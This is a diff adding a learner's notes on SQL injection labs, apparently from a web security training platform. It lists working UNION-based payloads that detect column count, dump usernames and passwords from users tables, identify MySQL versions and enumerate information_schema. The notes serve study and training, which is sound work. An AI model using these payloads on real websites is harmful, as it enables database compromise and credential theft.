@@ -76,3 +76,39 @@ After:
 SQL Injection can lead to full database compromise, data leakage, and in some cases remote code execution depending on database permissions.
 
 
+
+## Lab: SQL Injection UNION Attack — Finding Column with Text
+**Technique:** ORDER BY to find column count, UNION SELECT to find string column
+**Key payload:** `'+UNION+SELECT+NULL,'DI0tMU',NULL--+-`
+**What I learned:** Column 2 accepted strings — tested by moving value across positions
+
+---
+
+## Lab: SQL Injection UNION Attack — Retrieving Data from Other Tables
+**Technique:** UNION SELECT to extract credentials from users table
+**Key payload:** `'+UNION+SELECT+username,password+FROM+users--+-`
+**What I learned:** Direct table extraction — retrieved all credentials in one query
+
+---
+
+## Lab: SQL Injection UNION Attack — Retrieving Multiple Values in Single Column
+**Technique:** String concatenation using ||
+**Key payload:** `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--+-`
+**What I learned:** When only one column accepts strings, concatenate multiple values
+
+---
+
+## Lab: Database Version Detection — MySQL
+**Technique:** @@version variable
+**Key payload:** `'+UNION+SELECT+@@version,NULL#`
+**What I learned:** MySQL uses # for comments and @@version for version detection
+
+---
+
+## Lab: Database Enumeration — Non-Oracle
+**Technique:** information_schema enumeration
+**Key payloads:**
+- Tables: `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+-`
+- Columns: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+LIKE+'users_ddzebl'--+-`
+- Data: `'+UNION+SELECT+username_maxijo,password_adramj+FROM+users_ddzebl--+-`
+**What I learned:** Full enumeration chain — tables → columns → data extraction
